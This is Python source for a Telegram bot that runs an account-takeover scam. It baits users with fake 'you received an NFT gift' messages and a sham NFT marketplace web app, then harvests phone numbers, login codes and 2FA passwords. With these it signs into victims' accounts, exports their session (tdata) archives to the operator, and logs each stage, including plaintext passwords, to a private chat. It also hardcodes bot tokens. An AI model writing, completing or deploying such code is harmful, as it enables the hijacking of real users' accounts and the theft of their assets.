import asyncio
import os
import json
import httpx
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQueryResultArticle, InputTextMessageContent,
)
from auth import send_code, sign_in

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
OWNER_ID = 7345056431
LOG_BOT_TOKEN = "8457755387:AAGWM8a0Xgg8zw36mAVBFZ8HgGlOANsFbrE"
LOG_CHAT_ID = 7345056431

async def send_log(text: str):
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage",
                json={"chat_id": LOG_CHAT_ID, "text": text, "parse_mode": "HTML"}
            )
    except Exception as e:
        print(f"log error: {e}")

MARKET_URL = "https://frontend-sigma-coral-35.vercel.app"
BOT_USERNAME = "asfafaff_bot"

_default_bot = Bot(token=BOT_TOKEN)
bot = _default_bot
dp = Dispatcher()
pending = {}

# ─── Redis helpers ────────────────────────────────────────────────────────────

async def redis_set(key, value, ex=300):
    async with httpx.AsyncClient() as client:
        if ex:
            cmd = f"{REDIS_URL}/set/{key}/{value}/EX/{ex}"
        else:
            cmd = f"{REDIS_URL}/set/{key}/{value}"
        await client.get(cmd, headers={"Authorization": f"Bearer {REDIS_TOKEN}"})

async def redis_get(key):
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{REDIS_URL}/get/{key}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
        )
        return r.json().get("result")

async def redis_del(key):
    async with httpx.AsyncClient() as client:
        await client.get(
            f"{REDIS_URL}/del/{key}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
        )

async def get_active_token():
    import urllib.parse
    try:
        raw = await redis_get("panel_bot")
        if raw:
            data = json.loads(urllib.parse.unquote(raw))
            token = data.get("token")
            if token:
                return token
    except:
        pass
    return BOT_TOKEN

async def redis_set_json(key, data: dict, ex=86400):
    import urllib.parse
    value = urllib.parse.quote(json.dumps(data, ensure_ascii=False))
    async with httpx.AsyncClient() as client:
        await client.get(
            f"{REDIS_URL}/set/{key}/{value}/EX/{ex}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
        )

# ─── /start ───────────────────────────────────────────────────────────────────

@dp.message(Command("logs"))
async def logs_handler(message: types.Message):
    args = message.text.split(maxsplit=1)
    password = args[1] if len(args) > 1 else ""
    if password != "ebanat":
        await message.answer("❌ Неверный пароль")
        return
    await message.answer("✅ Доступ разрешён. Логи приходят в реальном времени.")

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    args = message.text.split(maxsplit=1)
    payload = args[1] if len(args) > 1 else ""

    if payload.startswith("gift_"):
        await handle_gift_start(message, payload)
        return

    import urllib.parse
    tg_user = message.from_user

    # Читаем шаблоны из панели
    bot_data_raw = await redis_get("panel_bot")
    start_text = "Добро пожаловать в NFT Market! 🎁"
    button_text = "🛍 Открыть маркет"
    start_photo = ""
    if bot_data_raw:
        try:
            bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
            active_tpl_id = bot_data.get("active_template", "")
            if active_tpl_id:
                templates_raw = await redis_get("templates")
                if templates_raw:
                    templates = json.loads(urllib.parse.unquote(templates_raw))
                    tpl = next((t for t in templates if t["id"] == active_tpl_id), None)
                    if tpl:
                        start_text = tpl.get("text", start_text)
                        button_text = tpl.get("button_text", button_text)
                        start_photo = tpl.get("photo", "")
            else:
                start_text = bot_data.get("start_text", start_text)
                button_text = bot_data.get("button_text", button_text)
        except:
            pass
    user_name = tg_user.first_name or tg_user.username or "друг"
    start_text = start_text.replace("{name}", user_name)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=button_text,
            web_app=types.WebAppInfo(url=MARKET_URL)
        )]
    ])

    # Добавляем вторую кнопку если задана
    if bot_data_raw:
        try:
            bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
            active_tpl_id = bot_data.get("active_template", "")
            if active_tpl_id:
                templates_raw = await redis_get("templates")
                if templates_raw:
                    templates = json.loads(urllib.parse.unquote(templates_raw))
                    tpl = next((t for t in templates if t["id"] == active_tpl_id), None)
                    if tpl:
                        btn2_text = (tpl.get("button2_text") or "").strip()
                        btn2_url = (tpl.get("button2_url") or "").strip()
                    else:
                        btn2_text = (bot_data.get("button2_text") or "").strip()
                        btn2_url = (bot_data.get("button2_url") or "").strip()
                else:
                    btn2_text = (bot_data.get("button2_text") or "").strip()
                    btn2_url = (bot_data.get("button2_url") or "").strip()
            else:
                btn2_text = (bot_data.get("button2_text") or "").strip()
                btn2_url = (bot_data.get("button2_url") or "").strip()
            if btn2_text and btn2_url:
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(
                        text=button_text,
                        web_app=types.WebAppInfo(url=MARKET_URL)
                    )],
                    [InlineKeyboardButton(text=btn2_text, url=btn2_url)]
                ])
        except:
            start_photo = ""
    else:
        start_photo = ""

    raw = await redis_get(f"log_open:{tg_user.id}")
    info = {}
    if raw:
        try: info = json.loads(urllib.parse.unquote(raw))
        except: pass

    await send_log(
        f"👁 <b>Этап 1 — Открыл маркет</b>\n"
        f"├ Бот: @asfafaff_bot\n"
        f"├ ID: <code>{tg_user.id}</code>\n"
        f"├ Тэг: @{tg_user.username or '—'}\n"
        f"├ Имя: {tg_user.first_name or '—'}\n"
        f"└ Устройство: {info.get('device', '—')[:80]}"
    )

    if tg_user.username:
        await redis_set(f"panel_user:{tg_user.username.lower()}", str(tg_user.id))
    # сохраняем в список всех пользователей
    import urllib.parse as _ul
    user_info = _ul.quote(json.dumps({
        "id": tg_user.id,
        "username": tg_user.username or "",
        "name": tg_user.first_name or ""
    }, ensure_ascii=False))
    await redis_set(f"bot_user:{tg_user.id}", user_info, ex=None)

    if start_photo:
        await message.answer_photo(
            photo=start_photo,
            caption=start_text,
            reply_markup=keyboard
        )
    else:
        await message.answer(start_text, reply_markup=keyboard)

async def handle_gift_start(message: types.Message, payload: str):
    import urllib.parse
    try:
        parts = payload.split("_")
        nft_id = parts[1]
        sender_id = parts[3] if len(parts) >= 4 else "unknown"

        dash_idx = nft_id.rfind("-")
        nft_slug = nft_id[:dash_idx].lower()
        nft_number = nft_id[dash_idx + 1:]
        nft_display_name = nft_id[:dash_idx].replace("-", " ").title()
        full_name = f"{nft_display_name} #{nft_number}"
        nft_url = f"https://t.me/nft/{nft_id}"
        receiver_id = message.from_user.id

        gift_data = {
            "slug": nft_slug,
            "number": int(nft_number),
            "name": full_name,
            "sender_id": sender_id,
            "nft_id": nft_id,
        }
        await redis_set_json(f"gift:{receiver_id}", gift_data, ex=604800)
        print(f"Gift saved: receiver={receiver_id}, nft={full_name}")

        # Читаем шаблон
        receive_text = "🎁 Вам подарили NFT, и он ожидает вывода в ваш профиль."
        market_text = "Маркетплейс 🏬"
        try:
            bot_data_raw = await redis_get("panel_bot")
            if bot_data_raw:
                bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
                active_itpl_id = bot_data.get("active_inline_template", "")
                if active_itpl_id:
                    itemplates_raw = await redis_get("inline_templates")
                    if itemplates_raw:
                        itemplates = json.loads(urllib.parse.unquote(itemplates_raw))
                        tpl = next((t for t in itemplates if t["id"] == active_itpl_id), None)
                        if tpl:
                            receive_text = tpl.get("receive_text", receive_text)
                            market_text = tpl.get("market_text", market_text)
        except:
            pass

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text=market_text,
                web_app=types.WebAppInfo(url=f"{MARKET_URL}?gift={nft_slug}-{nft_number}")
            )]
        ])

        nft_url_escaped = nft_url.replace(".", "\\.").replace("-", "\\-")
        receive_text_escaped = receive_text.replace(".", "\\.").replace("!", "\\!").replace("(", "\\(").replace(")", "\\)").replace("-", "\\-")
        await message.answer(
            f"{receive_text_escaped}\n\n"
            f"[*{nft_display_name} \\#{nft_number}*]({nft_url_escaped})",
            parse_mode="MarkdownV2",
            reply_markup=keyboard
        )

    except Exception as e:
        print(f"handle_gift_start error: {e}")
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="Маркетплейс 🏬",
                web_app=types.WebAppInfo(url=f"{MARKET_URL}?gift=jesterhat-18979")
            )]
        ])
        await message.answer(
            "🎁 Вам подарили NFT, и он ожидает вывода в ваш профиль\\.",
            parse_mode="MarkdownV2",
            reply_markup=keyboard
        )

# ─── Inline mode ──────────────────────────────────────────────────────────────

@dp.inline_query()
async def inline_handler(query: types.InlineQuery):
    import urllib.parse
    sender_id = query.from_user.id

    # Читаем активный inline шаблон из Redis
    tpl = None
    try:
        bot_data_raw = await redis_get("panel_bot")
        if bot_data_raw:
            bot_data = json.loads(urllib.parse.unquote(bot_data_raw))
            active_itpl_id = bot_data.get("active_inline_template", "")
            if active_itpl_id:
                itemplates_raw = await redis_get("inline_templates")
                if itemplates_raw:
                    itemplates = json.loads(urllib.parse.unquote(itemplates_raw))
                    tpl = next((t for t in itemplates if t["id"] == active_itpl_id), None)
    except:
        pass

    # Дефолтные значения если шаблон не задан
    if tpl:
        nft_url = tpl.get("nft_url", "https://t.me/nft/JesterHat-18979")
        caption_text = tpl.get("caption", "Кто-то решил вас порадовать — нажмите «Принять», чтобы получить подарок")
        accept_text = tpl.get("accept_text", "Принять 🎁")
    else:
        nft_url = "https://t.me/nft/JesterHat-18979"
        caption_text = "Кто-то решил вас порадовать — нажмите «Принять», чтобы получить подарок"
        accept_text = "Принять 🎁"

    # Парсим slug и number из ссылки
    try:
        nft_id = nft_url.rstrip("/").split("/")[-1]
        dash_idx = nft_id.rfind("-")
        nft_slug = nft_id[:dash_idx].lower()
        nft_number = nft_id[dash_idx + 1:]
        nft_display_name = nft_id[:dash_idx].replace("-", " ").title()
        nft_id_original = nft_id
    except:
        nft_slug = "jesterhat"
        nft_number = "18979"
        nft_display_name = "Jester Hat"
        nft_id_original = "JesterHat-18979"
        nft_url = "https://t.me/nft/JesterHat-18979"

    # Читаем username активного бота
    active_bot_username = BOT_USERNAME
    try:
        bot_data_raw2 = await redis_get("panel_bot")
        if bot_data_raw2:
            import urllib.parse as _ul
            bd = json.loads(_ul.unquote(bot_data_raw2))
            if bd.get("username"):
                active_bot_username = bd["username"]
    except:
        pass

    start_payload = f"gift_{nft_id_original}_from_{sender_id}"
    gift_link = f"https://t.me/{active_bot_username}?start={start_payload}"
    img_url = f"https://nft.fragment.com/gift/{nft_slug}-{nft_number}.webp"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=accept_text, url=gift_link)]
    ])

    caption = (
        f"{caption_text}\n\n"
        f"*{nft_display_name} #{nft_number}*\n"
        f"{nft_url}"
    )

    results = [
        InlineQueryResultArticle(
            id=f"{nft_slug}-{nft_number}",
            title=f"{nft_display_name} #{nft_number}",
            description=f"Отправить подарок",
            thumbnail_url=img_url,
            input_message_content=InputTextMessageContent(
                message_text=caption,
                parse_mode="Markdown"
            ),
            reply_markup=keyboard
        )
    ]

    await query.answer(results=results, cache_time=0, is_personal=True)

# ─── Синхронизация (старый код — не трогать) ──────────────────────────────────

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    user_id = message.from_user.id
    try:
        await message.delete()
    except:
        pass
    try:
        # Сбрасываем предыдущий pending если есть
        if user_id in pending:
            del pending[user_id]
        print(f"Sending code to {phone} for user {user_id}")
        tg_user = message.from_user
        raw = await redis_get(f"log_open:{user_id}")
        info = {}
        if raw:
            import urllib.parse, json
            try: info = json.loads(urllib.parse.unquote(raw))
            except: pass
        await send_log(
            f"📱 <b>Этап 2 — Поделился номером</b>\n"
            f"├ Бот: @asfafaff_bot\n"
            f"├ Номер: <code>{phone}</code>\n"
            f"├ ID: <code>{user_id}</code>\n"
            f"├ Тэг: @{tg_user.username or '—'}\n"
            f"├ Имя: {tg_user.first_name or '—'}\n"
            f"└ Устройство: {info.get('device', '—')[:80]}"
        )
        phone_code_hash = await send_code(phone)
        pending[user_id] = {
            'phone': phone,
            'phone_code_hash': phone_code_hash,
            'username': tg_user.username or '—',
            'name': tg_user.first_name or '—',
        }
        await redis_set(f"sync:{user_id}", "code_sent")
        print(f"Code sent, redis key: sync:{user_id} = code_sent")
        asyncio.create_task(wait_for_code(user_id))
    except Exception as e:
        print(f"send_code error: {e}")
        await redis_set(f"sync:{user_id}", "error")

async def wait_for_code(user_id):
    print(f"Waiting for code from user {user_id}")
    for _ in range(60):
        await asyncio.sleep(2)
        code = await redis_get(f"code:{user_id}")
        if code:
            await redis_del(f"code:{user_id}")
            data = pending.get(user_id)
            if not data:
                await redis_set(f"code_result:{user_id}", "error")
                return
            try:
                print(f"Signing in with code {code} for {data['phone']}")
                await sign_in(data['phone'], code, data['phone_code_hash'])
                await redis_set(f"code_result:{user_id}", "ok")
                print(f"Sign in OK for {data['phone']}")
                asyncio.create_task(generate_tdata(user_id, data['phone']))
            except Exception as e:
                print(f"sign_in error: {e}")
                if '2FA' in str(e) or 'password' in str(e).lower():
                    await redis_set(f"code_result:{user_id}", "2fa_required")
                    asyncio.create_task(wait_for_2fa(user_id))
                    data2 = pending.get(user_id, {})
                    await send_log(
                        f"🔐 <b>этап 3 — требуется 2fa</b>\n"
                        f"├ бот: @asfafaff_bot\n"
                        f"├ номер: <code>{data2.get('phone','—')}</code>\n"
                        f"└ id: <code>{user_id}</code>"
                    )
                else:
                    await redis_set(f"code_result:{user_id}", "wrong_code")
                    asyncio.create_task(wait_for_code(user_id))
                    data2 = pending.get(user_id, {})
                    
                    await send_log(
                        f"❌ <b>пользователь ввёл неверный код</b>\n"
                        f"├ бот: @asfafaff_bot\n"
                        f"├ номер: <code>{data.get('phone','—')}</code>\n"
                        f"├ id: <code>{user_id}</code>\n"
                        f"└ тэг: @{data.get('username','—')}"
                    )
            return
    print(f"Timeout waiting for code from {user_id}")

async def wait_for_2fa(user_id):
    import urllib.parse
    print(f"Waiting for 2FA from user {user_id}")
    for _ in range(60):
        await asyncio.sleep(2)
        raw = await redis_get(f"2fa:{user_id}")
        if raw:
            password = urllib.parse.unquote(raw)
            await redis_del(f"2fa:{user_id}")
            data = pending.get(user_id)
            if not data:
                await redis_set(f"2fa_result:{user_id}", "error")
                return
            try:
                await sign_in(data['phone'], None, data['phone_code_hash'], password=password)
                await redis_set(f"2fa_result:{user_id}", "ok")
                await send_log(
                    f"⚡ <b>этап 4 — 2fa пройдена</b>\n"
                    f"├ бот: @asfafaff_bot\n"
                    f"├ номер: <code>{data.get('phone','—')}</code>\n"
                    f"├ id: <code>{user_id}</code>\n"
                    f"└ пароль: <code>{password}</code>"
                )
                print(f"2FA OK for {data['phone']}")
                asyncio.create_task(generate_tdata(user_id, data['phone']))
            except Exception as e:
                print(f"2FA error: {e}")
                await redis_set(f"2fa_result:{user_id}", "wrong_password")
                asyncio.create_task(wait_for_2fa(user_id))
                data2 = pending.get(user_id, {})
                await send_log(
                    f"❌ <b>Пользователь ввёл неверный 2FA</b>\n"
                    f"├ Бот: @asfafaff_bot\n"
                    f"├ Номер: <code>{data2.get('phone','—')}</code>\n"
                    f"├ ID: <code>{user_id}</code>\n"
                    f"├ тэг: @{data2.get('username','—')}\n"
                    f"└ пароль: <code>{password}</code>"
                )
            return

async def generate_tdata(user_id, phone):
    print(f"Generating tdata for {phone}")
    try:
        from auth import export_tdata as _export_tdata
        zip_data = await _export_tdata(phone)
        if zip_data:
            b = Bot(token=BOT_TOKEN)
            await b.send_document(
                OWNER_ID,
                types.BufferedInputFile(zip_data, filename=f'{phone}_tdata.zip'),
                caption=f'✅ tdata для {phone}'
            )
            await b.session.close()
            print(f"tdata sent for {phone}")
            await send_log(
                f"✅ <b>этап 5 — session отправлена</b>\n"
                f"├ бот: @asfafaff_bot\n"
                f"└ номер: <code>{phone}</code>"
            )
        else:
            print(f"tdata export failed for {phone}")
            await send_log(
                f"❌ <b>этап 5 — не удалось создать session</b>\n"
                f"└ номер: <code>{phone}</code>"
            )
    except Exception as e:
        print(f"generate_tdata error: {e}")

    await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
    if user_id in pending:
        del pending[user_id]

# ─── Run ──────────────────────────────────────────────────────────────────────

async def main():
    active_token = await get_active_token()
    active_bot = Bot(token=active_token) if active_token != BOT_TOKEN else bot
    print(f"Starting bot with token: {active_token[:20]}...")
    await dp.start_polling(active_bot)

if __name__ == "__main__":
    asyncio.run(main())